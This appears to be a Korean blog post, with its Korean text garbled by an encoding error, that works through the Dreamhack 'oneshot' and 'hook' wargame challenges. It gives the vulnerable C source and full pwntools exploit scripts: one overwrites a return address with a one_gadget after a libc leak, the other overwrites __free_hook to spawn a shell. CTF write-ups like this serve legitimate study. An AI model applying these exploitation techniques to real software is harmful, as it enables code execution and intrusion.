---
title:  "TIL: oneshot, Hook Overwrite ğŸ”«"
excerpt: "2022.08.05 TIL âœ"
toc: true
toc_sticky: true

categories:
  - TIL
  - Hacking
---

## Wargame: [oneshot](https://dreamhack.io/wargame/challenges/34/)

ë¬¸ì œì˜ ì†ŒìŠ¤ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ë‹¤.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

### Vulnerability scanning

- `checksec`
    
    <p align="center">
		<a href="/assets/images/TIL220805/Untitled.png">
			<img src="/assets/images/TIL220805/Untitled.png" width="600">
    	</a>
	</p>
    
    canaryê°€ ì ìš©ë˜ì–´ ìˆì§€ ì•Šì§€ë§Œ, ì†ŒìŠ¤ ì½”ë“œ ë‚´ì˜ `check`**ì´ ì¼ì¢…ì˜ canaryì˜ ì—­í• ì„ ìˆ˜í–‰**í•˜ê³  ìˆë‹¤.
    
- `stdout`**ì˜ ì£¼ì†Œê°€ ë…¸ì¶œ**ëœë‹¤. â†’ **one_gadgetì˜ ì£¼ì†Œë¥¼ ì–»ì„** ìˆ˜ ìˆë‹¤.
- `MSG`ë¥¼ ì…ë ¥ë°›ëŠ” ë¶€ë¶„ì—ì„œ **stack buffer overflow**ê°€ ë°œìƒí•œë‹¤. ì½”ë“œ ë§ˆì§€ë§‰ì˜ `memset`ì— ì˜í•´ `msg` ë‚´ì˜ ê°’ì€ ëª¨ë‘ 0ìœ¼ë¡œ ì§€ì›Œì§€ì§€ë§Œ, **buffer ë°–ìœ¼ë¡œ ë„˜ì³ë‚œ ê°’ì€ ê·¸ëŒ€ë¡œ ìœ ì§€**ëœë‹¤.

### one_gadget ì°¾ê¸°

<p align="center">
	<a href="/assets/images/TIL220805/Untitled (1).png">
		<img src="/assets/images/TIL220805/Untitled (1).png" width="600">
   	</a>
</p>

### Stack frame êµ¬ì¡° íŒŒì•…í•˜ê¸°

gdbë¥¼ ì´ìš©í•´ stack frameì˜ êµ¬ì¡°ë¥¼ íŒŒì•…í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ stackì´ êµ¬ì„±ë˜ì–´ ìˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤:

- `msg` -> 0x10 bytes
- dummy -> 0x8 bytes
- `check` -> 0x8 bytes
- sfp -> 0x8 bytes
- return address -> 0x8 bytes

### Exploit

`**main`ì˜ return addressë¥¼ one_gadgetì˜ ì£¼ì†Œë¡œ overwriteí•œë‹¤.**

```python
from pwn import *

p = remote("host3.dreamhack.games", 9713)
libc = ELF("./libc.so.6")

p.recvuntil("stdout: ")
libc_base = int(p.recvline()[:-1], 16) - libc.symbols["_IO_2_1_stdout_"]
og = libc_base + 0x4526a

p.recvuntil("MSG: ")
payload = b"A"*(0x10 + 0x8)
payload += p64(0) # checkì´ 0ì¸ì§€ ê²€ì‚¬í•˜ëŠ” ì½”ë“œë¥¼ bypassí•˜ê¸° ìœ„í•¨
payload += b"A"*0x8
payload += p64(og)
p.sendline(payload)

p.interactive()
```

- ì£¼ì˜í•  ì ìœ¼ë¡œ, `libc_base`ë¥¼ êµ¬í•  ë•Œ ë¹¼ì£¼ëŠ” ê°’ì„ `libc.symbols["stdout"]`ë¡œ ì…ë ¥í•˜ë©´ ì•ˆëœë‹¤. gdbë¥¼ í†µí•´ ì •í™•í•œ ì´ë¦„ì„ í™•ì¸í•˜ë©´ `"_IO_2_1_stdout_"`ì´ ì‚¬ìš©ë˜ê³  ìˆìŒì„ ì•Œ ìˆ˜ ìˆë‹¤.

## Wargame: [hook](https://dreamhack.io/wargame/challenges/52/)

ë¬¸ì œì˜ ì†ŒìŠ¤ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ë‹¤.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```

### Vulnerability scanning

- `checksec`
    <p align="center">
		<a href="/assets/images/TIL220805/Untitled (2).png">
			<img src="/assets/images/TIL220805/Untitled (2).png" width="600">
    	</a>
	</p>
- `stdout`**ì˜ ì£¼ì†Œê°€ ë…¸ì¶œ**ëœë‹¤.
- `*(long *)*ptr = *(ptr+1);` â†’ `malloc`ìœ¼ë¡œ í• ë‹¹ëœ ë©”ëª¨ë¦¬ì˜ **ì²« ë²ˆì§¸ 8 byteì— ì í˜€ ìˆëŠ” ë¶€ë¶„ì˜ ì£¼ì†Œë¡œ ë‘ ë²ˆì§¸ 8 byteì— ì í˜€ ìˆëŠ” ê°’ì„ ì‘ì„±**í•œë‹¤. â‡’ **ì›í•˜ëŠ” ì£¼ì†Œì— ì›í•˜ëŠ” 8 byteì˜ ê°’ì„ ì‘ì„±í•  ìˆ˜ ìˆë‹¤. (key point)**
- í”„ë¡œê·¸ë¨ì˜ ë§ˆì§€ë§‰ì— `system("/bin/sh")`ê°€ ìˆë‹¤. ì¼ë°˜ì ì¸ í”„ë¡œê·¸ë¨ì˜ íë¦„ìœ¼ë¡œëŠ” `free`**ê°€ ë‘ ë²ˆ ì‹¤í–‰ë˜ë©° errorê°€ ë°œìƒ**í•˜ê¸° ë•Œë¬¸ì— ì‹¤ì œë¡œëŠ” ì‹¤í–‰ë˜ì§€ ì•ŠëŠ”ë‹¤.

### Exploit

one_gadget ì°¾ëŠ” ê³¼ì •ì€ ìœ„ì™€ ë™ì¼í•˜ë‹¤.

```python
from pwn import *

p = remote("host3.dreamhack.games", 21497)
libc = ELF("./libc.so.6")

p.recvuntil("stdout: ")
libc_base = int(p.recvline()[:-1], 16) - libc.symbols["_IO_2_1_stdout_"]
free_hook = libc_base + libc.symbols["__free_hook"]
og = libc_base + 0x4f302

p.recvuntil("Size: ")
p.sendline("16")

p.recvuntil("Data: ")
payload = p64(free_hook) + p64(og)
p.sendline(payload)

p.interactive()
```

- ìœ„ í’€ì´ì—ì„œëŠ” `free_hook`ì„ `og`ë¡œ overwriteí–ˆì§€ë§Œ, `free_hook`**ì„ ê·¸ëƒ¥** `ret`**í•˜ëŠ” gadgetìœ¼ë¡œ overwrite**í•˜ì—¬ í”„ë¡œê·¸ë¨ ë§ˆì§€ë§‰ì— ìˆëŠ” `system("/bin/sh")`ì´ ì‹¤í–‰ë˜ë„ë¡ í•  ìˆ˜ë„ ìˆë‹¤. ê·¸ëƒ¥ ROPgadgetìœ¼ë¡œ `ret`í•˜ëŠ” gadgetì˜ ì£¼ì†Œë¥¼ ì°¾ê³ , ì´ ì£¼ì†Œë¡œ `free_hook`ì„ overwriteí•˜ê¸°ë§Œ í•˜ë©´ ëœë‹¤.